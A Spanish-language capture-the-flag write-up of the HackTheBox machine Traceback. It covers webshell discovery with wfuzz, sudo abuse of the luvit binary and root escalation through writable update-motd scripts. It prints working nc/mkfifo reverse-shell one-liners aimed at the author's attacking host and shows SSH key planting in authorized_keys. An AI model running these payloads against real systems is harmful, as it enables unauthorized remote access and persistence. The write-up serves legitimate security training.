---
title: HTB-TRACEBACK
author: Christian Gutierrez
date: 2020-11-19 14:10:00 -0500
categories: [HackTheBox, Medium]
tags: [HTB, SSH, NodeJS]
image: /assets/htb/01_traceback/portada.PNG
---
## Decripción del entorno
### <span style="color:green">Atacante</span>

| OS          | Kali Linux     |
| IP          | 10.10.15.14    |
### <span style="color:green">Maquina Objetivo</span>

| OS          | Linux               |
| IP          | 10.10.10.181        |
| Dificultad  | 4.8/10 / **Medium** |
| URL         | [**TraceBack**](https://www.hackthebox.eu/home/machines/profile/233)    |

## Enumeración
Se realiza la enumeración habitual para el reconocimiento e identificación de los puertos abiertos en el sistema: 
```console
$ nmap -sS -sV -sC -oN nmap_traceback 10.10.10.181
```
![Escaneo con Nmap](/assets/htb/01_traceback/01_nmap_scan.png)
_Resultado escaneo con nmap_

Se accede al puerto 80 y se infiere por contexto que el servidor ya tiene un WebShell, la cual hay que utilizar para continuar con el proceso de explotación. 
![Puerto 80](/assets/htb/01_traceback/02_puerto_80.png)
_Pagina web desplegada en el puerto 80_

Se saca un listado de las WebShell más conocidas <https://github.com/TheBinitGhimire/Web-Shells>, y se realiza un barrido utilizando **wFuzz** para identificar si alguna se encuentra persistente en el servidor: 
```console
$ wfuzz -w htb/01_traceback/webshells.dict --hc 404 http://10.10.10.181/FUZZ
```
Resultado: 
- cmd.php
    - Parametro: ?cmd=**COMANDO**
- smevk.php
    - User: **admin**
    - Password: **admin**

Una vez identificadas, se procede a validar el usuario y los privilegios que se tienen para la ejecución de comandos.
![WebShell Básica](/assets/htb/01_traceback/03_cmd_comandos_basicos.png)
_Usando shell cmd.php con comandos pwd, whoami e ifconfig_

### Usuarios de bajos privilegios
- webadmin [**Hacked**]
- sysadmin

Por medio de los Sudoers desde el usuario **webadmin** vemos que tenemos permisos para ejecutar un comando como el usuario **sysadmin**:
```console
$ sudo -l 
/home/sysadmin/luvit
```
De lo anterior se identifica que [luvit](https://luvit.io/) corresponde a un servicio **NodeJS** para el lenguaje **Lua** por lo que conserva su sintaxis y además es posible utilizarlo para ejecutar scripts **.lua** diseñados por nosotros; vamos a utilizar el metodo `os.execute()` que nos permite ejecutar comandos de sistema operativo en [LUA](https://stackoverflow.com/questions/13270346/lua-os-execute-does-not-work)

## Explotación

Una vez identificado el vector de ataque, vamos a utilizar una Shell reversa con **nc** a través de la ejecución privilegiada de `/home/sysadmin/luvit`, por lo que creamos el siguiente archivo **lua** en el directorio `/tmp/`:

```lua
os.execute("rm /tmp/cdf;mkfifo /tmp/cdf;cat /tmp/cdf|/bin/sh -i 2>&1|nc 10.10.15.14 4545 >/tmp/cdf")
```

Ejecutamos el archivo con los privilegios de **sysadmin** de la siguiente manera: 
```console
$ sudo -u sysadmin /home/sysadmin/luvit /tmp/d.lua
```
Recibimos la conexión inversa mediante **NetCat**:
```console
$ nc -nvlp 4545
```
![Reverse Shell](/assets/htb/01_traceback/04_reverse_shell.png)
_Reverse Shell con privilegios del usuario sysadmin_

Aunque ya tenemos la shell con los privilegios **Sysadmin** que nos permiten la lectura de la flag `user.txt`, es más comodo poder conectarnos directamente al servicio SSH (22), para así tener más estabilidad y propiedades en la consola; para lograr esto, debemos agregar nuestra **llave pública SSH** al archivo `authorized_keys` del servidor victima, de esta manera, sin proporcionar credenciales podemos acceder a este. 
```console
$ echo “test” >> authorized_keys
Permission denied
```
Como no podemos realizarlo desde la shell que tenemos actualmente, creamos otro archivo **.lua** que cambie los privilegios del archivo "" y agregue nuestra key: 
```lua
file = io.open("/home/sysadmin/.ssh/authorized_keys", "w")
file:write("ssh-rsa AAAAB3NzaC1yc2EAAAADA/.../zWoMYWXUF8ZIOQp0= csl@support")
file:close()
```
Ejecutamos el nuevo script **LUA**: 
```console
$ sudo -u sysadmin /home/sysadmin/luvit /tmp/d2.lua
```
Y accedemos al servidor mediante **SSH**: 
```console
$ ssh sysadmin@10.10.10.181
```
![SSH](/assets/htb/01_traceback/05_ssh_access.png)
_Acceso por SSH al usuario Sysadmin_

## Elevación de privilegios

Revisando los procesos en ejecución del sistema `ps aux`, vemos que el usuario root realiza la ejecución recurrente del siguiente comando. 
```console
$ /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
```
Lo que inicialmente parece una copia de archivos normal entre directorios cada 30 segundos, nos revela una pista en los permisos del directorio `/etc/update-motd.d/`:
![SSH](/assets/htb/01_traceback/06_priv_etc_update.png)
_Permisos del directorio /etc/update-motd.d/_

Y recordemos que dicho directorio corresponde a los scripts de personalización de inicio o acceso mediante **SSH**, así pues, cada uno de esos script’s mostrará información o será ejecutado por el usuario **root** cuando alguien se conecta mediante **SSH**. De esta manera, si logramos algún cambio en estos scripts, lo podremos activar mediante el acceso a SSH que tenemos del usuario **Sysadmin**. 

Considerando lo anterior, agregamos el comando para que cuando se ejecute nos permita una conexión inversa a nuestro equipo, por el puerto 4545. 
```console
$ echo "rm /tmp/cdf;mkfifo /tmp/cdf;cat /tmp/cdf|/bin/sh -i 2>&1|nc 10.10.15.14 4545 >/tmp/cdf" >> /etc/update-motd.d/00-header
```
Una vez realizado, accedemos al servicio **SSH** con el usuario **Sysadmin** (para activa nuestro payload) y a su vez, recibimos la conexión inversa en nuestro equipo, esta vez con privilegios de **root**. 

Otra forma de acceder sin utilizar la shell reversa, implicaría el mismo principio de habilitar nuestras llaves en el servicio **SSH** del usuario **root**: 

```console
sysadmin@traceback:/etc/update-motd.d$ echo "cp /home/sysadmin/.ssh/authorized_keys /root/.ssh/" >> 00-header 
```

Bytez ;)